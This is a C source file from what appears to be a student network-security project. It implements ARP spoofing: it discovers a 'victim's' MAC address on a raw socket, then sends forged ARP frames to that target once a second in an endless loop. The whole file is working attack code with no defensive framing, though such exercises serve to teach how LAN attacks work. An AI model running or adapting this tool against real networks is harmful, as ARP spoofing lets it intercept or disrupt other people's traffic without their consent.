/*
** EPITECH PROJECT, 2019
** RSD64
** File description:
** arp.c
*/

#include "my.h"


void init_stct(struct addrinfo *info, stct_t *stct, sock_t *arp, uint8_t *src)
{
    info->ai_flags = info->ai_flags | AI_CANONNAME;
    info->ai_socktype = SOCK_STREAM;
    info->ai_family = AF_INET;
    stct->length = 6 + 6 +2 + 28;
    memcpy(stct->dev.sll_addr, stct->src_mac, 6 * sizeof(uint8_t));
    stct->dev.sll_family = AF_PACKET;
    stct->dev.sll_halen = 6;
    arp->SH = htons(1);
    arp->sck2 = 4;
    memset(&arp->aM, 0xff, 6 * sizeof(uint8_t));
    memcpy(&arp->oM, src, 6 * sizeof(uint8_t));
    arp->cOP = htons(1);
    arp->SP = htons(ETH_P_IP);
    arp->sck = 6;
}

int new(stct_t *stct)
{
    struct addrinfo info;
    struct sockaddr_in *middle;
    struct addrinfo *addr;
    sock_t arp;

    memset(&info, 0, sizeof(struct addrinfo));
    if ((stct->dev.sll_ifindex = if_nametoindex(stct->interf)) == 0)
        exit(1);
    init_stct(&info, stct, &arp, stct-> src_mac);
    if ((inet_pton(AF_INET, stct->src_ip, &arp.oI)) != 1)
        exit(1);
    if ((getaddrinfo(stct->dest_ip, NULL, &info, &addr)) != 0)
        exit(1);
    middle = (struct sockaddr_in *)addr->ai_addr;
    memcpy(&arp.aI, &middle->sin_addr, 4 * sizeof(uint8_t));
    freeaddrinfo(addr);
    memcpy(stct->message, stct->dest_mac, 6 * sizeof(uint8_t));
    memcpy(stct->message + 6, stct->src_mac, 6 * sizeof(uint8_t));
    stct->message[12] = ETH_P_ARP / 256;
    stct->message[13] = ETH_P_ARP % 256;
    memcpy(stct->message + 14, &arp, 28 * sizeof(uint8_t));
}

void sendarp(stct_t stct)
{
    int sock;
    int nb_char;

    if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
        exit(1);
    while (1) {
        if ((nb_char = sendto(sock, stct.message, stct.length, 0, (struct sockaddr *)&stct.dev, sizeof(stct.dev))) <= 0) {
            close(sock);
            exit(1);
        }
        printf("Spoofed packet sent to '%s'\n", stct.dest_ip);
        sleep(1);
    }
}

void receive(stct_t *stct)
{
    sock_t *struc;
    int sock = 0;
    int tmp = 0;

    stct->dest_mac = memsi(6);
    stct->message = memsi(IP_MAXPACKET);
    if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
        exit(1);
    struc = (sock_t *)(stct->message + 14);
    while (((((stct->message[12]) << 8) + stct->message[13]) != ETH_P_ARP) || (ntohs(struc->cOP) != 2)) {
        if ((tmp = recv(sock, stct->message, IP_MAXPACKET, 0)) < 0)
            exit(1);
    }
    close(sock);
    printf("Found victim's MAC address: '");
    for (int nbr = 0; nbr < 6; nbr++) {
        stct->dest_mac[nbr] = stct->message[nbr + 6];
        if (nbr != 0)
            printf(":");
        printf("%02x", stct->dest_mac[nbr]);
    }
    printf("'\n");
}
